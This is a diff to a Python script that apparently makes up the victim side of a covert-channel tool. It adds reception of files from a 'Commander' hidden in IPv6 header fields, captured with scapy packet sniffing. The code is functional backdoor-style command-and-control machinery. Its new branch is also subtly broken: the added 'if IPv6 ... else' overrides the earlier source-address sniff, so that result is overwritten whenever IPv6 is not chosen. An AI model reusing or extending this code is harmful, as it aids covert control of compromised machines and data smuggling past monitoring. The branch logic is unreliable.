@@ -219,6 +219,8 @@ if __name__ == '__main__':
 
                 # e) Receive File from Commander (Covert Channel)
                 if data.decode() == constants.TRANSFER_FILE_SIGNAL:
+                    # Initialize Variables
+                    ipv6_ip, ipv6_port = "", constants.ZERO
                     print(constants.CLIENT_RESPONSE.format(constants.TRANSFER_FILE_SIGNAL))
 
                     # Send an initial acknowledgement to the client (giving them green light for transfer)
@@ -229,10 +231,17 @@ if __name__ == '__main__':
                     filename = res[0]
                     choices = (res[1], res[2])  # => (header, header_field)
 
+                    # CHECK: If destination field choice, do nothing
                     if constants.DESTINATION_ADDRESS_FIELD in choices:
                         print(constants.FILE_TRANSFER_UNSUCCESSFUL)
                         continue
                         # return None
+
+                    # CHECK: If IPv6 header was chosen
+                    if constants.IPV6 in choices:
+                        ipv6_ip, ipv6_port = receive_get_ipv6_script(client_socket,
+                                                                     client_address[0],
+                                                                     client_address[1])
 
                     # Print configuration
                     print(constants.RECEIVING_FILE_MSG.format(filename))
@@ -258,6 +267,8 @@ if __name__ == '__main__':
                     if constants.SOURCE_ADDRESS_FIELD in choices:
                         received_packets = sniff(filter="dst host {} and dst port {}"
                                                  .format(source_ip, source_port), count=count)
+                    if constants.IPV6 in choices:
+                        received_packets = sniff(filter="ip6 and dst host {}".format(ipv6_ip), count=count)
                     else:  # REGULAR SNIFF
                         received_packets = sniff(filter="src host {}".format(client_address[0]), count=count)
 
@@ -274,7 +285,6 @@ if __name__ == '__main__':
                         client_socket.send(constants.VICTIM_ACK.encode())
                     else:
                         client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
-
 
 
                 # f) Transfer file to Commander
